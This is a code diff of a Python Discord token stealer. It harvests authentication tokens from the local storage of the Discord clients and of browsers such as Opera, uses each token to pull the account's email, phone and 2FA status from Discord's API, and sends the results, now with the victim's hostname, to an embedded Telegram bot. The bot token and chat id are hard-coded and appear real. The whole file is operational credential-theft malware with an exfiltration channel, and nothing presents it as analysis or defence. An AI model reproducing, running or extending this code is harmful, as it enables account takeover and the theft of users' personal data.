@@ -5,15 +5,20 @@ import typing
 import json
 import urllib.request
 import requests
+import platform
+
+node_name = platform.node()
 
 bot_token = "8059570004:AAH1Z9kfQTQLl8HirnZ7exDvuk5emI0qF_w"
 chat_id = "7611773286"
+
 
 TOKEN_REGEX_PATTERN = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{34,38}"
 REQUEST_HEADERS = {
     "Content-Type": "application/json",
     "User-Agent": "Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11"
 }
+
 
 APP_PATHS = {
     "Discord": "%AppData%\\discord\\Local Storage\\leveldb",
@@ -25,160 +30,177 @@ APP_PATHS = {
     "Opera": "%AppData%\\Opera Software\\Opera Stable\\Local Storage\\leveldb"
 }
 
-def get_tokens_from_file(file_path: str) -> typing.List[str]:
+
+def make_post_request(api_url: str, data: typing.Dict[str, str]) -> int:
+    request = urllib.request.Request(
+        api_url, data=json.dumps(data).encode(),
+        headers=REQUEST_HEADERS
+    )
+
+    with urllib.request.urlopen(request) as response:
+        response_status = response.status
+
+    return response_status
+
+
+def get_tokens_from_file(file_path: str) -> typing.Union[list[str], None]:
+    with open(file_path, encoding="utf-8", errors="ignore") as text_file:
+        try:
+            file_contents = text_file.read()
+        except PermissionError:
+            return None
+
+    tokens = re.findall(TOKEN_REGEX_PATTERN, file_contents)
+
+    return tokens if tokens else None
+
+
+def get_user_id_from_token(token: str) -> typing.Union[None, str]:
     try:
-        with open(file_path, encoding="utf-8", errors="ignore") as f:
-            contents = f.read()
-    except (PermissionError, FileNotFoundError):
-        return []
-
-    tokens = re.findall(TOKEN_REGEX_PATTERN, contents)
-    return tokens
-
-def remove_duplicate_tokens(token_entries: typing.List[dict]) -> typing.List[dict]:
-    seen_tokens = set()
-    unique_entries = []
-    for entry in token_entries:
-        token = entry["token"]
-        if token not in seen_tokens:
-            seen_tokens.add(token)
-            unique_entries.append(entry)
-    return unique_entries
-
-def get_user_id_from_token(token: str) -> typing.Optional[str]:
-    try:
-        return base64.b64decode(token.split(".")[0] + "==").decode("utf-8")
-    except:
+        discord_user_id = base64.b64decode(
+            token.split(".", maxsplit=1)[0] + "=="
+        ).decode("utf-8")
+    except UnicodeDecodeError:
         return None
 
-def get_discord_user_info(token: str) -> typing.Optional[dict]:
+    return discord_user_id
+
+
+def get_discord_user_info(token: str) -> typing.Union[dict, None]:
+    """Fetch user information from Discord API using the token"""
     try:
         headers = {
             "Authorization": token,
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
         }
-        request = urllib.request.Request("https://discord.com/api/v9/users/@me", headers=headers)
+        request = urllib.request.Request(
+            "https://discord.com/api/v9/users/@me",
+            headers=headers
+        )
+        
         with urllib.request.urlopen(request) as response:
             if response.status == 200:
                 return json.loads(response.read().decode())
     except:
-        return None
+        pass
     return None
 
-def get_tokens_from_path(base_path: str, app_name: str) -> typing.List[dict]:
-    if not os.path.exists(base_path):
-        return []
 
-    file_paths = [os.path.join(base_path, f) for f in os.listdir(base_path) if os.path.isfile(os.path.join(base_path, f))]
-    token_entries: typing.List[dict] = []
+def get_tokens_from_path(base_path: str, app_name: str) -> typing.Dict[str, dict]:
+    if not os.path.exists(base_path):
+        return None
+
+    file_paths = [
+        os.path.join(base_path, filename) for filename in os.listdir(base_path)
+        if os.path.isfile(os.path.join(base_path, filename))
+    ]
+
+    id_to_tokens: typing.Dict[str, dict] = dict()
 
     for file_path in file_paths:
-        tokens = get_tokens_from_file(file_path)
-        if not tokens:
+        potential_tokens = get_tokens_from_file(file_path)
+
+        if potential_tokens is None:
             continue
 
-        for token in tokens:
-            user_id = get_user_id_from_token(token)
-            if not user_id:
+        for potential_token in potential_tokens:
+            discord_user_id = get_user_id_from_token(potential_token)
+
+            if discord_user_id is None:
                 continue
-            user_info = get_discord_user_info(token)
-            token_entries.append({
-                "token": token,
-                "user_id": user_id,
-                "source": app_name,
-                "info": user_info
-            })
 
-    return token_entries
+            if discord_user_id not in id_to_tokens:
+                id_to_tokens[discord_user_id] = {
+                    "tokens": set(),
+                    "sources": set(),
+                    "info": None
+                }
 
-def send_t_to_telegram_grouped(bot_token: str, chat_id: str, token_entries: typing.List[dict]) -> None:
-    # Group tokens by username
-    grouped_tokens = {}
-    separate_tokens = []
+            id_to_tokens[discord_user_id]["tokens"].add(potential_token)
+            id_to_tokens[discord_user_id]["sources"].add(app_name)
+            
+            
+            if id_to_tokens[discord_user_id]["info"] is None:
+                user_info = get_discord_user_info(potential_token)
+                if user_info:
+                    id_to_tokens[discord_user_id]["info"] = user_info
 
-    for entry in token_entries:
-        user_info = entry.get("info")
-        username = None
-        if user_info:
-            username = f"{user_info.get('username', 'N/A')}#{user_info.get('discriminator', 'N/A')}"
+    return id_to_tokens if id_to_tokens else None
 
-        if username and username != "N/A#N/A":
-            if username not in grouped_tokens:
-                grouped_tokens[username] = []
-            grouped_tokens[username].append(entry)
-        else:
-            separate_tokens.append(entry)
+def send_t_to_telegram(bot_token: str, chat_id: str, all_tokens: typing.Dict[str, dict]) -> int:
+    """
+    Sends token info to a Telegram chat using a bot.
+    
+    :param bot_token: Your Telegram bot token
+    :param chat_id: The chat ID to send the message to
+    :param all_tokens: Dictionary containing token info
+    :return: HTTP status code of the request
+    """
+    messages = []
 
-    # Send grouped tokens with full account info
-    for username, entries in grouped_tokens.items():
-        message_lines = [f"Tokens for **{username}**:"]
-        for entry in entries:
-            token = entry["token"]
-            source = entry["source"]
-            user_info = entry.get("info")
-
-            account_info = "No additional account information available"
-            if user_info:
-                account_info = (
-                    f"Email: {user_info.get('email', 'N/A')}\n"
-                    f"Phone: {user_info.get('phone', 'N/A')}\n"
-                    f"2FA Enabled: {user_info.get('mfa_enabled', False)}\n"
-                    f"Verified: {user_info.get('verified', False)}\n"
-                    f"Nitro: {user_info.get('premium_type', 0) > 0}"
-                )
-            message_lines.append(f"\nToken: {token} (from: {source})\nAccount Information:\n{account_info}")
-
-        message_lines.append("\n----------------------")
-        message = "\n".join(message_lines)
-        response = requests.post(
-            f"https://api.telegram.org/bot{bot_token}/sendMessage",
-            data={"chat_id": chat_id, "text": message}
-        )
-        if response.status_code != 200:
-            print("Failed to send message:", response.text)
-
-    # Send separate tokens without username
-    for entry in separate_tokens:
-        token = entry["token"]
-        source = entry["source"]
-        user_info = entry.get("info")
-
+    for user_id, token_data in all_tokens.items():
+        token_list = "\n".join([
+            f"{token} (from: {', '.join(token_data['sources'])})"
+            for token in token_data["tokens"]
+        ])
+        
         account_info = "No additional account information available"
-        if user_info:
+        if token_data["info"]:
+            user = token_data["info"]
             account_info = (
-                f"Email: {user_info.get('email', 'N/A')}\n"
-                f"Phone: {user_info.get('phone', 'N/A')}\n"
-                f"2FA Enabled: {user_info.get('mfa_enabled', False)}\n"
-                f"Verified: {user_info.get('verified', False)}\n"
-                f"Nitro: {user_info.get('premium_type', 0) > 0}"
+                f"Username: {user.get('username', 'N/A')}#{user.get('discriminator', 'N/A')}\n"
+                f"Email: {user.get('email', 'N/A')}\n"
+                f"Phone: {user.get('phone', 'N/A')}\n"
+                f"2FA Enabled: {user.get('mfa_enabled', False)}\n"
+                f"Verified: {user.get('verified', False)}\n"
+                f"Nitro: {user.get('premium_type', 0) > 0}\n"
+                f"{node_name}\n"
             )
+        
+        message = f"User ID: {user_id}\n\nTokens:\n{token_list}\n\nAccount Information:\n{account_info}\n\n----------------------"
+        messages.append(message)
 
-        message = f"Token: {token} (from: {source})\nNo username available.\nAccount Information:\n{account_info}\n----------------------"
+    # Telegram messages have a max length, so you may need to split if very long
+    for msg in messages:
         response = requests.post(
             f"https://api.telegram.org/bot{bot_token}/sendMessage",
-            data={"chat_id": chat_id, "text": message}
+            data={"chat_id": chat_id, "text": msg}
         )
         if response.status_code != 200:
             print("Failed to send message:", response.text)
+
+    return 1
 
 def main() -> None:
-    all_tokens: typing.List[dict] = []
+    all_tokens: typing.Dict[str, dict] = {}
 
     for app_name, path_template in APP_PATHS.items():
         expanded_path = os.path.expandvars(path_template)
         tokens = get_tokens_from_path(expanded_path, app_name)
-        if tokens:
-            all_tokens.extend(tokens)
+
+        if tokens is None:
+            continue
+
+        
+        for user_id, token_data in tokens.items():
+            if user_id not in all_tokens:
+                all_tokens[user_id] = {
+                    "tokens": set(),
+                    "sources": set(),
+                    "info": None
+                }
+            all_tokens[user_id]["tokens"].update(token_data["tokens"])
+            all_tokens[user_id]["sources"].update(token_data["sources"])
+            
+            if token_data["info"] and not all_tokens[user_id]["info"]:
+                all_tokens[user_id]["info"] = token_data["info"]
 
     if not all_tokens:
         print("No Discord tokens found in any of the checked locations.")
         return
 
-    # Remove duplicates
-    all_tokens = remove_duplicate_tokens(all_tokens)
+    send_t_to_telegram(bot_token, chat_id, all_tokens)
 
-    # Send messages grouped by username with full info
-    send_t_to_telegram_grouped(bot_token, chat_id, all_tokens)
 
 if __name__ == "__main__":
     main()
